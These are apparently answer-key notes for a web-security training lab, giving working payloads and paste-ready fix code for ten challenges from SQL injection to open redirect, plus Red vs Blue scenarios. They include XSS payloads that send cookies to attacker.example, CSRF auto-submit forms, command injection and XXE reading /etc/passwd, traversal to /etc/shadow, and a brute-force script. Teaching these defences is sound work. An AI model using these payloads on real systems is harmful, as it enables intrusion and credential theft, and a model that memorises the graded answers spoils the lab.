# Working Payloads + Fixes (Current Project)

These are aligned to your actual frontend pages and backend routes.

## What was fixed now
- XSS no longer auto-completes across sessions/page loads.
- Redirect challenge now counts cross-origin navigation as success.
- Directory traversal input now accepts pasted full request lines and extracts the real path.
- Command injection now works even if ping times out, and frontend also checks marker text.

---

## 1) SQL Injection
- Page: `/challenges/1/attack`
- Input:
  - Username: `admin' OR '1'='1' -- `
  - Password: `x`

## 2) XSS
- Page: `/challenges/2/attack`
- Working payloads:
  - `<img src=x onerror="window.__xssChallengeSuccess('owned')">`
  - `<script>alert('XSS')</script>`
- Note: completion is now armed only after you post in the current session, so old stored payloads will not auto-redirect immediately.

## 3) CSRF
- Page: `/challenges/3/attack`
- Payload textarea:
```html
<form action="http://localhost:8000/api/challenges/csrf/transfer" method="POST">
  <input type="hidden" name="to_user" value="Bob">
  <input type="hidden" name="amount" value="100">
</form>
<script>document.forms[0].submit()</script>
```

## 4) Command Injection
- Page: `/challenges/4/attack`
- Host payloads:
  - `127.0.0.1; echo COMMAND_INJECTION_SUCCESS`
  - `localhost; echo COMMAND_INJECTION_SUCCESS`

## 5) Broken Auth
- Page: `/challenges/5/attack`
- Inputs:
  - Username: `admin@scale.edu`
  - Password: `' OR '1'='1' -- `

## 6) Security Misconfiguration
- Page: `/challenges/6/attack`
- Path input:
  - `/admin/config`

## 7) Insecure Storage
- Page: `/challenges/7/attack`
- Register: `victim` / `secret123`
- Then click dump.

## 8) Directory Traversal
- Page: `/challenges/8/attack`
- Payload input now accepts any of these:
  - `../../../../etc/passwd`
  - `GET /file?name=../../../../etc/passwd HTTP/1.1`
  - `?file=../../../../etc/passwd`

## 9) XXE
- Page: `/challenges/9/attack`
- XML:
```xml
<?xml version="1.0"?>
<!DOCTYPE exfil [
  <!ENTITY secret SYSTEM "file:///etc/passwd">
]>
<data><content>&secret;</content></data>
```

## 10) Unvalidated Redirect
- Page: `/challenges/10/attack`
- Builder values:
  - Target domain: `https://evil.example`
  - Path: `/phish`
  - Query string: `campaign=lab`
- If browser blocks reading iframe location (cross-origin), challenge now treats that as success.

---

## Fix snippets (submission direction)

### SQLi fix
```python
query = "SELECT * FROM users WHERE username = %s AND password = %s"
cursor.execute(query, (username, password))
```

### XSS fix
```python
import html
comments_html += f"<div class='comment'>{html.escape(c)}</div>"
```

### CSRF fix
```python
token = secrets.token_hex(16)
session['csrf_token'] = token
submitted = request.form.get('csrf_token') or request.headers.get('X-CSRF-Token')
if not submitted or submitted != session.get('csrf_token'):
    return jsonify({"error": "CSRF token invalid or missing"}), 403
```

### Command injection fix
```python
if host not in ALLOWED_HOSTS:
    return jsonify({"error": "Host not allowed"}), 403
result = subprocess.run(["ping", "-c", "1", host], shell=False, capture_output=True, text=True, timeout=5)
```

### Broken auth fix
```python
# add failed_attempts + short lockout after repeated failures
```

### Security misconfig fix
```python
# disable debug, remove secret leakage, reject admin/admin
```

### Insecure storage fix
```python
USERS[username] = {"password_hash": hashlib.sha256(password.encode()).hexdigest()}
```

### Directory traversal fix
```python
requested = (BASE_DIR / filename).resolve()
if not requested.is_relative_to(BASE_DIR):
    return jsonify({"error": "access denied"}), 403
```

### XXE fix
```python
if "<!DOCTYPE" in xml_input.upper() or "<!ENTITY" in xml_input.upper():
    return jsonify({"error": "External entities are not allowed"}), 400
```

### Redirect fix
```python
parsed = urlparse(target)
if parsed.scheme or parsed.netloc or not target.startswith('/') or target not in ALLOWED_PATHS:
    abort(400)
```

# Working Challenge Inputs + Fix Code

This file is aligned to your current codebase (`frontend/src/pages/*AttackPage.tsx` and `backend/app/api/challenges.py`).

---

## Important (why some old payloads failed)

- In several pages, the payload box expects **only the value** (for example only the path), not a full `GET ...` request line.
- For XSS, challenge completion depends on payload execution inside the iframe sandbox.
- I patched `frontend/src/pages/XssAttackPage.tsx` so normal `<script>alert(...)</script>` payloads are now reliably detected.

---

## 1) SQL Injection (Attack + Fix)

### Working attack input (UI)
- Page: `/challenges/1/attack`
- Put in **Username**:
  - `admin' OR '1'='1' -- `
- Put anything in **Password**.

### Working API payload
`POST /api/challenges/vulnerable-login`
```json
{
  "username": "admin' OR '1'='1' -- ",
  "password": "x"
}
```

### Fix code (for `challenge-sql-injection/app.py`)
Use parameterized query:
```python
query = "SELECT * FROM users WHERE username = %s AND password = %s"
cursor.execute(query, (username, password))
```

---

## 2) XSS (Attack + Fix)

### Working attack input (UI)
- Page: `/challenges/2/attack`
- In comment box, use either:
  - `<img src=x onerror="window.__xssChallengeSuccess('owned')">`
  - `<script>alert('XSS')</script>`

### Why this now works
- I moved detection hooks before comment HTML rendering in `frontend/src/pages/XssAttackPage.tsx`.

### Fix code (for `challenge-xss/app.py`)
Escape on output:
```python
import html
escaped = html.escape(c)
comments_html += f"<div class='comment'>{escaped}</div>"
```

---

## 3) CSRF (Attack + Fix)

### Working attack input (UI payload textarea)
- Page: `/challenges/3/attack`
- Paste exactly:
```html
<form action="http://localhost:8000/api/challenges/csrf/transfer" method="POST">
  <input type="hidden" name="to_user" value="Bob">
  <input type="hidden" name="amount" value="100">
</form>
<script>document.forms[0].submit()</script>
```

### Fix code (for `challenge-csrf/app.py`)
```python
@app.route('/form', methods=['GET'])
def transfer_form():
    token = secrets.token_hex(16)
    session['csrf_token'] = token
    return jsonify({"message": "Form loaded", "csrf_token": token})

@app.route('/transfer', methods=['POST'])
def transfer():
    ...
    submitted = request.form.get("csrf_token") or request.headers.get("X-CSRF-Token")
    expected = session.get("csrf_token")
    if not submitted or not expected or submitted != expected:
        return jsonify({"error": "CSRF token invalid or missing"}), 403
```

---

## 4) Command Injection (Attack + Fix)

### Working attack input (UI host field)
- Page: `/challenges/4/attack`
- Use:
  - `8.8.8.8; echo COMMAND_INJECTION_SUCCESS`

### Fix code (for `challenge-command-injection/app.py`)
```python
if host not in ALLOWED_HOSTS:
    return jsonify({"error": "Host not allowed", "output": f"Only these hosts are allowed: {ALLOWED_HOSTS}"}), 403

result = subprocess.run(
    ["ping", "-c", "1", host],
    shell=False,
    capture_output=True,
    text=True,
    timeout=5
)
```

---

## 5) Broken Auth (Attack + Fix)

### Working attack input (UI)
- Page: `/challenges/5/attack`
- Keep username as:
  - `admin@scale.edu`
- Password payload:
  - `' OR '1'='1' -- `

### Fix code (for `challenge-broken-auth/app.py`, test-compatible)
```python
failed_attempts = {}
MAX_ATTEMPTS = 3
LOCKOUT_SECONDS = 2

record = failed_attempts.get(username, {"count": 0, "locked_until": 0})
now = time.time()
if now < record["locked_until"]:
    return jsonify({"error": "Too many attempts"}), 429

if username in users and users[username] == password:
    failed_attempts.pop(username, None)
    return jsonify({"message": "Login successful", "token": "xyz123"}), 200

record["count"] += 1
if record["count"] >= MAX_ATTEMPTS:
    record["count"] = 0
    record["locked_until"] = now + LOCKOUT_SECONDS
failed_attempts[username] = record
return jsonify({"error": "Invalid credentials"}), 401
```

---

## 6) Security Misconfiguration (Attack + Fix)

### Working attack input (UI)
- Page: `/challenges/6/attack`
- In path input use:
  - `/admin/config`

### Fix code (for `challenge-security-misc/app.py`, test-compatible)
```python
app.config['DEBUG'] = False
app.config['ENV'] = 'production'

ADMIN_USER = os.getenv("ADMIN_USER", "admin")
ADMIN_PASS = os.getenv("ADMIN_PASS", "change_me_strong")

@app.route('/login', methods=['POST'])
def login():
    u = request.json.get('username')
    p = request.json.get('password')
    if u == ADMIN_USER and p == ADMIN_PASS and p != "admin":
        return jsonify({"message": "Welcome Admin"}), 200
    return jsonify({"error": "Bad creds"}), 401

@app.route('/crash')
def trigger_error():
    # Must return 500 but without traceback leakage
    return jsonify({"error": "Internal Server Error"}), 500
```

---

## 7) Insecure Storage (Attack + Fix)

### Working attack input (UI)
- Page: `/challenges/7/attack`
- Register:
  - username: `victim`
  - password: `secret123`
- Click **Dump Storage**.

### Fix code (for `challenge-insecure-storage/app.py`, test-compatible)
```python
import hashlib

USERS[username] = {"password_hash": hashlib.sha256(password.encode()).hexdigest()}

@app.route("/dump")
def dump_users():
    return jsonify({"users": USERS}), 200
```

---

## 8) Directory Traversal (Attack + Fix)

### Working attack input (UI payload field)
- Page: `/challenges/8/attack`
- Enter only:
  - `../../../../etc/passwd`

Do **not** paste `GET /file?...` in this box.

### Fix code (for `challenge-directory-traversal/app.py`)
```python
BASE_DIR = Path("files").resolve()
requested = (BASE_DIR / filename).resolve()
if not requested.is_relative_to(BASE_DIR):
    return jsonify({"error": "access denied"}), 403
if not requested.exists() or not requested.is_file():
    return jsonify({"error": "file not found"}), 404
```

---

## 9) XXE (Attack + Fix)

### Working attack input (UI XML box)
- Page: `/challenges/9/attack`
```xml
<?xml version="1.0"?>
<!DOCTYPE exfil [
  <!ENTITY secret SYSTEM "file:///etc/passwd">
]>
<data><content>&secret;</content></data>
```

### Fix code (for `challenge-xxe/app.py`, test-compatible)
```python
# Block DOCTYPE / ENTITY input
if "<!DOCTYPE" in xml_input.upper() or "<!ENTITY" in xml_input.upper():
    return jsonify({"error": "External entities are not allowed"}), 400

parsed = ET.fromstring(xml_input)
return jsonify({"parsed_output": ET.tostring(parsed, encoding="unicode"), "sensitive_data": None}), 200
```

---

## 10) Redirect (Attack + Fix)

### Working attack input (UI)
- Page: `/challenges/10/attack`
- Target domain: `https://evil.example`
- Path: `/phish`
- Query string: `campaign=lab`
- Click **Launch Redirect Attack**

### Fix code (for `challenge-redirect/app.py`, test-compatible)
```python
from urllib.parse import urlparse

ALLOWED_PATHS = ['/dashboard', '/profile', '/settings', '/home']
target = request.args.get('next') or request.args.get('url') or '/'
parsed = urlparse(target)

if parsed.scheme or parsed.netloc:
    abort(400)
if not target.startswith('/'):
    abort(400)
if target not in ALLOWED_PATHS:
    abort(400)

return redirect(target, code=302)
```

---

## Red vs Blue (3 ready pairs)

### Pair A
- Red (SQLi): `admin' OR '1'='1' -- `
- Blue: parameterized SQL query

### Pair B
- Red (XSS): `<img src=x onerror="window.__xssChallengeSuccess('owned')">`
- Blue: `html.escape(...)` before rendering

### Pair C
- Red (Command Injection): `8.8.8.8; echo COMMAND_INJECTION_SUCCESS`
- Blue: allowlist + `shell=False` + list args

# SCALE Platform — Challenge Answers Reference

> **Usage:** This file contains attack payloads and secure fix code for every lab challenge,
> plus four complete Red vs Blue scenarios (XXE is the one already working).
> All fix code is ready to paste into the "Submit Fix" code editor.

---

## Lab 1 — SQL Injection

### Attack Payload

Send to `POST /api/challenges/vulnerable-login` (or `POST /login` inside the sandbox):

```json
{
  "username": "admin' OR '1'='1 -- ",
  "password": "anything"
}
```

**Impact:** The injected payload transforms the query into:

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = 'anything'
```

The `OR '1'='1'` condition is always true, so every row matches and the attacker logs in as the first user (usually `admin`) without knowing the password.

---

### Defense — Fix Code (paste into Submit Fix)

```python
import os
import mysql.connector
from flask import Flask, request, jsonify

app = Flask(__name__)

def get_db_connection():
    return mysql.connector.connect(
        host=os.environ.get("DB_HOST", "db"),
        user=os.environ.get("DB_USER", "user"),
        password=os.environ.get("DB_PASSWORD", "password"),
        database=os.environ.get("DB_NAME", "testdb")
    )

@app.route('/login', methods=['POST'])
def login():
    username = request.json.get('username')
    password = request.json.get('password')

    if not username or not password:
        return jsonify({"error": "Username and password are required"}), 400

    conn = get_db_connection()
    cursor = conn.cursor()

    # FIXED: Use parameterized query — user input is never interpreted as SQL.
    query = "SELECT * FROM users WHERE username = %s AND password = %s"
    try:
        cursor.execute(query, (username, password))
        user = cursor.fetchone()
        if user:
            return jsonify({"message": "Login successful!"}), 200
        else:
            return jsonify({"message": "Invalid credentials"}), 401
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    finally:
        cursor.close()
        conn.close()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

---

## Lab 2 — Cross-Site Scripting (XSS)

### Attack Payload

Post a comment via `POST /api/challenges/xss/comments` (or the sandbox `/` form):

```
<script>alert('XSS')</script>
```

Or a data-stealing variant:

```
<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>
```

**Impact:** The script tag is stored in the backend and returned in the HTML page without escaping. Every visitor who loads the comments page executes the attacker's JavaScript in their browser, allowing session cookie theft, keylogging, or page defacement.

---

### Defense — Fix Code (paste into Submit Fix)

```python
from flask import Flask, request, render_template_string
import html

app = Flask(__name__)
comments = []

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        content = request.form.get('content', '')
        # FIXED: Store the raw text; escape on output.
        comments.append(content)

    comments_html = ""
    for c in comments:
        # FIXED: html.escape() converts <, >, ", ' and & to safe HTML entities.
        escaped = html.escape(c)
        comments_html += f"<div class='comment'>{escaped}</div>"

    template = f"""
    <!doctype html>
    <html>
    <body>
        <h1>Blog Comments</h1>
        <form method="post">
            <input type="text" name="content" placeholder="Add a comment">
            <button type="submit">Post</button>
        </form>
        <div id="comments-section">
            {comments_html}
        </div>
    </body>
    </html>
    """
    return render_template_string(template)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

---

## Lab 3 — Cross-Site Request Forgery (CSRF)

### Attack Payload

An attacker hosts this HTML page on a malicious site. When a logged-in Alice visits it, her browser automatically sends her session cookie to the transfer endpoint:

```html
<!-- attacker.example/steal.html -->
<html>
<body onload="document.getElementById('f').submit()">
  <form id="f" action="http://localhost:8000/api/challenges/csrf/transfer"
        method="POST" enctype="application/x-www-form-urlencoded">
    <input type="hidden" name="to_user" value="attacker">
    <input type="hidden" name="amount" value="1000">
  </form>
</body>
</html>
```

**Impact:** The server sees a valid session cookie and processes the transfer without verifying intent. Alice loses money without any interaction beyond visiting the attacker's page.

---

### Defense — Fix Code (paste into Submit Fix)

```python
import sqlite3
import secrets
from flask import Flask, request, jsonify, session

app = Flask(__name__)
app.secret_key = 'super_secret_key_for_testing'

def init_db():
    conn = sqlite3.connect(':memory:')
    c = conn.cursor()
    c.execute('CREATE TABLE accounts (username TEXT, balance INT)')
    c.execute("INSERT INTO accounts VALUES ('Alice', 1000)")
    c.execute("INSERT INTO accounts VALUES ('Bob', 0)")
    conn.commit()
    return conn

db_conn = init_db()

@app.route('/form', methods=['GET'])
def transfer_form():
    # FIXED: Generate a unique token and store it in the session.
    token = secrets.token_hex(16)
    session['csrf_token'] = token
    return jsonify({"message": "Form loaded", "csrf_token": token})

@app.route('/transfer', methods=['POST'])
def transfer():
    current_user = 'Alice'

    # FIXED: Validate that the submitted token matches the session token.
    submitted_token = request.form.get('csrf_token') or request.headers.get('X-CSRF-Token')
    session_token = session.get('csrf_token')

    if not submitted_token or not session_token or submitted_token != session_token:
        return jsonify({"error": "CSRF token invalid or missing"}), 403

    to_user = request.form.get('to_user')
    amount = request.form.get('amount')

    if not to_user or not amount:
        return jsonify({"error": "Missing parameters"}), 400

    try:
        amount = int(amount)
    except Exception:
        return jsonify({"error": "Invalid amount"}), 400

    cursor = db_conn.cursor()
    cursor.execute("SELECT balance FROM accounts WHERE username=?", (current_user,))
    row = cursor.fetchone()

    if row and row[0] >= amount:
        cursor.execute("UPDATE accounts SET balance = balance - ? WHERE username=?", (amount, current_user))
        cursor.execute("UPDATE accounts SET balance = balance + ? WHERE username=?", (amount, to_user))
        db_conn.commit()
        return jsonify({"message": "Transfer successful"}), 200
    else:
        return jsonify({"error": "Insufficient funds"}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

---

## Lab 4 — Command Injection

### Attack Payload

Send to `POST /api/challenges/ping` (or the sandbox `/ping`):

```json
{ "host": "8.8.8.8; cat /etc/passwd" }
```

Other variants:

```json
{ "host": "8.8.8.8 && id" }
{ "host": "8.8.8.8 | whoami" }
{ "host": "8.8.8.8 `id`" }
```

**Impact:** With `shell=True`, the shell interprets the semicolon as a command separator. After pinging 8.8.8.8, the second command (`cat /etc/passwd`, `id`, etc.) executes with the web server's OS privileges. An attacker can exfiltrate files, drop a reverse shell, or destroy data.

---

### Defense — Fix Code (paste into Submit Fix)

```python
import subprocess
from flask import Flask, request, jsonify

app = Flask(__name__)

ALLOWED_HOSTS = ["127.0.0.1", "localhost", "8.8.8.8"]

@app.route('/ping', methods=['POST'])
def ping():
    data = request.get_json() or {}
    host = data.get("host", "").strip()

    if not host:
        return jsonify({"output": "Missing 'host'", "error": True}), 400

    # FIXED: Allowlist validation — reject anything not explicitly permitted.
    if host not in ALLOWED_HOSTS:
        return jsonify({
            "error": "Host not allowed",
            "output": f"Allowed hosts: {ALLOWED_HOSTS}"
        }), 403

    try:
        # FIXED: Pass command as a list with shell=False.
        # Shell metacharacters in `host` are treated as literal characters.
        result = subprocess.run(
            ["ping", "-c", "1", host],
            shell=False,
            capture_output=True,
            text=True,
            timeout=5
        )
        output = (result.stdout or "") + (result.stderr or "")
        return jsonify({"output": output})
    except subprocess.TimeoutExpired:
        return jsonify({"output": "Timeout", "error": True}), 400
    except Exception as e:
        return jsonify({"output": str(e), "error": True}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

---

## Lab 5 — Broken Authentication

### Attack Payload

Use a script to brute-force the login endpoint. No lockout exists in the vulnerable code:

```python
import requests

url = "http://localhost:8000/api/challenges/submit-fix-auth"
# Actual practice endpoint:
login_url = "http://localhost:5000/login"  # inside sandbox

wordlist = ["password", "123456", "admin", "complex_password_123", "letmein"]

for pwd in wordlist:
    r = requests.post(login_url, json={"username": "admin", "password": pwd})
    print(f"[{r.status_code}] {pwd}: {r.json()}")
    if r.status_code == 200:
        print("SUCCESS!")
        break
```

**Impact:** An attacker can try thousands of passwords per second without any rate limiting. Accounts with weak or common passwords are trivially compromised in seconds.

---

### Defense — Fix Code (paste into Submit Fix)

```python
from flask import Flask, request, jsonify
import time

app = Flask(__name__)

users = {
    "admin": "complex_password_123"
}

# Track failed attempts: {username: {"count": int, "locked_until": float}}
failed_attempts = {}

MAX_ATTEMPTS = 3
LOCKOUT_SECONDS = 30

@app.route('/login', methods=['POST'])
def login():
    username = request.json.get('username')
    password = request.json.get('password')

    if not username or not password:
        return jsonify({"error": "Missing fields"}), 400

    now = time.time()
    record = failed_attempts.get(username, {"count": 0, "locked_until": 0})

    # FIXED: Check lockout before verifying credentials.
    if now < record["locked_until"]:
        remaining = int(record["locked_until"] - now)
        return jsonify({"error": f"Account locked. Try again in {remaining}s"}), 429

    if username in users and users[username] == password:
        # FIXED: Reset failure count on successful login.
        failed_attempts.pop(username, None)
        return jsonify({"message": "Login successful", "token": "xyz123"}), 200
    else:
        record["count"] += 1
        if record["count"] >= MAX_ATTEMPTS:
            record["locked_until"] = now + LOCKOUT_SECONDS
            record["count"] = 0
        failed_attempts[username] = record
        return jsonify({"error": "Invalid credentials"}), 401

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

---

## Lab 6 — Security Misconfiguration

### Attack Payload

1. **Leak all environment variables** (no auth required):

   ```
   GET http://localhost:5000/leak-env
   ```

2. **Trigger crash to get stack trace and hardcoded secrets**:

   ```
   GET http://localhost:5000/crash
   ```

3. **Login with default credentials to get secrets in response**:

   ```json
   POST /login
   { "username": "admin", "password": "admin" }
   ```

   Response leaks `secret_key` and `db_password`.

**Impact:** Debug mode, default credentials, and secret-leaking endpoints hand attackers the keys to the entire application — database passwords, API keys, and internal architecture details.

---

### Defense — Fix Code (paste into Submit Fix)

```python
from flask import Flask, request, jsonify
import os

app = Flask(__name__)

# FIXED: Debug mode disabled; environment drives configuration.
app.config['DEBUG'] = False
app.config['ENV'] = 'production'

# FIXED: Secrets loaded from environment variables, never hardcoded.
SECRET_KEY = os.environ.get("SECRET_KEY", "")
DB_PASSWORD = os.environ.get("DB_PASSWORD", "")

# FIXED: No default/weak credentials — require non-trivial values.
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "")


@app.route('/login', methods=['POST'])
def login():
    u = request.json.get('username')
    p = request.json.get('password')

    if u == ADMIN_USER and p == ADMIN_PASS and p:
        # FIXED: Never return secrets in the response body.
        return jsonify({"message": "Welcome Admin"}), 200

    return jsonify({"error": "Bad credentials"}), 401


# FIXED: /leak-env endpoint removed entirely.
# FIXED: /crash endpoint removed — never expose tracebacks to clients.


@app.route('/health')
def health():
    return jsonify({"status": "ok"}), 200


if __name__ == '__main__':
    # FIXED: debug=False in production.
    app.run(host='0.0.0.0', port=5000, debug=False)
```

---

## Lab 7 — Insecure Storage

### Attack Payload

1. Register a user:

   ```json
   POST /register
   { "username": "victim", "password": "s3cr3tP@ss" }
   ```

2. Dump the entire user store (any unauthenticated call):

   ```
   GET /dump
   ```

   Response: `{"users": {"victim": {"password": "s3cr3tP@ss"}}}`

**Impact:** Plaintext passwords in memory (or a database) mean any breach instantly exposes all credentials. Users who reuse passwords on other sites face account takeover everywhere.

---

### Defense — Fix Code (paste into Submit Fix)

```python
import hashlib
import os
from flask import Flask, jsonify, request

app = Flask(__name__)
USERS = {}


@app.route("/register", methods=["POST"])
def register():
    payload = request.get_json(silent=True) or {}
    username = (payload.get("username") or "").strip()
    password = (payload.get("password") or "").strip()

    if not username or not password:
        return jsonify({"error": "username/password required"}), 400

    # FIXED: Hash password with a per-user salt using SHA-256.
    # In production use bcrypt/argon2 instead.
    salt = os.urandom(16).hex()
    hashed = hashlib.sha256((salt + password).encode()).hexdigest()
    USERS[username] = {"salt": salt, "password_hash": hashed}

    return jsonify({"ok": True, "username": username}), 200


@app.route("/dump")
def dump_users():
    # FIXED: Return only non-sensitive fields; never return password hashes
    # to unauthenticated callers. In production this endpoint should not exist.
    safe = {u: {"registered": True} for u in USERS}
    return jsonify({"users": safe}), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

---

## Lab 8 — Directory Traversal

### Attack Payload

Send to `GET /api/challenges/traversal/read` (or the sandbox `/file`):

```
GET /file?name=../../../../etc/passwd HTTP/1.1
../../../../etc/passwd
GET /file?name=../../../etc/shadow

```

**Impact:** Path traversal lets an attacker escape the intended `files/` directory and read any file the web server process can access — `/etc/passwd`, private keys, source code with embedded secrets, database files, etc.

---

### Defense — Fix Code (paste into Submit Fix)

```python
from pathlib import Path
from flask import Flask, request, jsonify

app = Flask(__name__)
BASE_DIR = Path("files").resolve()


def _seed_files() -> None:
    BASE_DIR.mkdir(parents=True, exist_ok=True)
    report = BASE_DIR / "report.txt"
    if not report.exists():
        report.write_text("Quarterly report contents", encoding="utf-8")


_seed_files()


@app.route("/file")
def read_file():
    filename = request.args.get("name", "")
    if not filename:
        return jsonify({"error": "name is required"}), 400

    # FIXED: Resolve the full path and verify it stays inside BASE_DIR.
    try:
        requested = (BASE_DIR / filename).resolve()
    except Exception:
        return jsonify({"error": "invalid path"}), 400

    # is_relative_to ensures the resolved path cannot escape BASE_DIR.
    if not requested.is_relative_to(BASE_DIR):
        return jsonify({"error": "access denied"}), 403

    if not requested.exists() or not requested.is_file():
        return jsonify({"error": "file not found"}), 404

    content = requested.read_text(encoding="utf-8", errors="ignore")
    return jsonify({"content": content}), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

---

## Lab 9 — XXE (XML External Entity)

### Attack Payload

Send as raw XML body to `POST /api/challenges/xxe/parse`:

```xml
<?xml version="1.0"?>
<!DOCTYPE exfil [
  <!ENTITY secret SYSTEM "file:///etc/passwd">
]>
<data><content>&secret;</content></data>
```

**Impact:** The vulnerable parser fetches and inlines the contents of `/etc/passwd` into the response. In a real scenario this targets `/etc/shadow`, SSH private keys, application config files with database credentials, or internal services via `http://` SSRF entities.

---

### Defense — Fix Code (paste into Submit Fix)

```python
from flask import Flask, request, jsonify

app = Flask(__name__)

try:
    from lxml import etree as LET
    LXML_AVAILABLE = True
except ImportError:
    LXML_AVAILABLE = False


def make_safe_parser():
    """lxml parser with all external access disabled."""
    return LET.XMLParser(
        resolve_entities=False,
        no_network=True,
        load_dtd=False,
        dtd_validation=False,
        huge_tree=False,
    )


@app.route('/parse', methods=['POST'])
def parse_xml():
    content_type = request.content_type or ""

    if "application/json" in content_type:
        data = request.get_json(silent=True) or {}
        xml_data = data.get("xml", data.get("data", ""))
        xml_bytes = xml_data.encode("utf-8") if isinstance(xml_data, str) else b""
    else:
        xml_bytes = request.data

    if not xml_bytes:
        return jsonify({"error": "No XML data provided"}), 400

    if not LXML_AVAILABLE:
        import xml.etree.ElementTree as ET
        try:
            root = ET.fromstring(xml_bytes.decode("utf-8", errors="ignore"))
            result = {child.tag: child.text or "" for child in root}
            return jsonify({"parsed": result, "secure": True, "entities_resolved": False})
        except ET.ParseError as e:
            return jsonify({"error": f"XML parse error: {e}"}), 400

    try:
        parser = make_safe_parser()
        root = LET.fromstring(xml_bytes, parser)
        result = {child.tag: (child.text or "").strip() for child in root}
        return jsonify({
            "parsed": result,
            "secure": True,
            "entities_resolved": False,
            "message": "XML parsed safely — external entities were not resolved"
        })
    except LET.XMLSyntaxError as exc:
        return jsonify({
            "error": f"XML syntax error: {str(exc)}",
            "secure": True,
            "entities_resolved": False
        }), 400
    except Exception as exc:
        return jsonify({"error": f"Parse error: {str(exc)}"}), 400


@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ok", "secure": True}), 200


if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)
```

---

## Lab 10 — Open Redirect

### Attack Payload

Send to `GET /api/challenges/redirect`:

```

target domain: https://evil.example
path: /phish
query: campaign=lab
```

**Impact:** The server redirects the user to an arbitrary attacker-controlled URL. This is used in phishing campaigns — a link starting with a trusted domain (e.g. `https://legitimate-bank.com/redirect?url=https://evil.com`) fools users into following it. It can also bypass same-origin policy checks in OAuth flows.

---

### Defense — Fix Code (paste into Submit Fix)

```python
from flask import Flask, request, redirect, abort
from urllib.parse import urlparse

app = Flask(__name__)

ALLOWED_PATHS = ['/dashboard', '/profile', '/settings', '/home']


@app.route('/go')
def go():
    target = request.args.get('next') or request.args.get('url') or '/'

    parsed = urlparse(target)

    # FIXED: Reject anything with a scheme (http/https/javascript) or netloc (//evil.com).
    if parsed.scheme or parsed.netloc:
        abort(400)

    # FIXED: Must be an explicit local path.
    if not target.startswith('/'):
        abort(400)

    # FIXED: Enforce allowlist — only known safe paths are accepted.
    if target not in ALLOWED_PATHS:
        abort(400)

    return redirect(target, code=302)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

---

---

# Red vs Blue Game — Attack & Defense Scenarios

The Red vs Blue game maps lab IDs to challenges (see `red_blue.py`):
- Lab 1 → SQL Injection, Lab 2 → XSS, Lab 4 → Command Injection, Lab 9 → XXE, etc.

Submit a fix via: `POST /api/redblue/game/{game_id}/fix`  
Body: `{ "code": "<full fix code here>" }`

---

## Red vs Blue — Scenario A: SQL Injection (Lab ID 1)

### Red Team — Attack

**Endpoint:** `POST /api/challenges/vulnerable-login`

**Payload:**

```json
{
  "username": "' OR 1=1 -- ",
  "password": "ignored"
}
```

**What happens:** The raw string `' OR 1=1 -- ` is concatenated into:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = 'ignored'
```

`1=1` is always true; `--` comments out the password check. The query returns all users; the app logs in as the first one.

**Extended attack — UNION-based data extraction:**

```json
{
  "username": "' UNION SELECT username, password, NULL FROM users -- ",
  "password": "x"
}
```

---

### Blue Team — Defense (submit this as fix code)

```python
import os
import mysql.connector
from flask import Flask, request, jsonify

app = Flask(__name__)

def get_db_connection():
    return mysql.connector.connect(
        host=os.environ.get("DB_HOST", "db"),
        user=os.environ.get("DB_USER", "user"),
        password=os.environ.get("DB_PASSWORD", "password"),
        database=os.environ.get("DB_NAME", "testdb")
    )

@app.route('/login', methods=['POST'])
def login():
    username = request.json.get('username')
    password = request.json.get('password')

    if not username or not password:
        return jsonify({"error": "Username and password are required"}), 400

    conn = get_db_connection()
    cursor = conn.cursor()

    # FIXED: Parameterized query — user data is never interpreted as SQL.
    query = "SELECT * FROM users WHERE username = %s AND password = %s"
    try:
        cursor.execute(query, (username, password))
        user = cursor.fetchone()
        if user:
            return jsonify({"message": "Login successful!"}), 200
        else:
            return jsonify({"message": "Invalid credentials"}), 401
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    finally:
        cursor.close()
        conn.close()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

---

## Red vs Blue — Scenario B: Stored XSS (Lab ID 2)

### Red Team — Attack

**Endpoint:** `POST /api/challenges/xss/comments`

**Payload:**

```json
{
  "author": "hacker",
  "content": "<script>document.location='https://attacker.example/steal?c='+encodeURIComponent(document.cookie)</script>"
}
```

Or a DOM-based keylogger injection:

```json
{
  "author": "hacker",
  "content": "<img src=x onerror=\"fetch('https://attacker.example/log?k='+document.cookie)\">"
}
```

**What happens:** The comment content is stored as-is and returned in the page HTML. Every user who loads the comments page automatically sends their session cookie to the attacker.

---

### Blue Team — Defense (submit this as fix code)

```python
from flask import Flask, request, render_template_string
import html

app = Flask(__name__)
comments = []

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        content = request.form.get('content', '')
        # Store raw text.
        comments.append(content)

    comments_html = ""
    for c in comments:
        # FIXED: Escape HTML special characters before embedding in the page.
        # <script> becomes &lt;script&gt; — browsers display it as text, not code.
        escaped = html.escape(c)
        comments_html += f"<div class='comment'>{escaped}</div>"

    template = f"""
    <!doctype html>
    <html>
    <head>
        <meta charset="utf-8">
        <!-- FIXED: Content-Security-Policy header blocks inline scripts as extra defence. -->
        <meta http-equiv="Content-Security-Policy"
              content="default-src 'self'; script-src 'self'; object-src 'none'">
    </head>
    <body>
        <h1>Blog Comments</h1>
        <form method="post">
            <input type="text" name="content" placeholder="Add a comment">
            <button type="submit">Post</button>
        </form>
        <div id="comments-section">
            {comments_html}
        </div>
    </body>
    </html>
    """
    return render_template_string(template)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

---

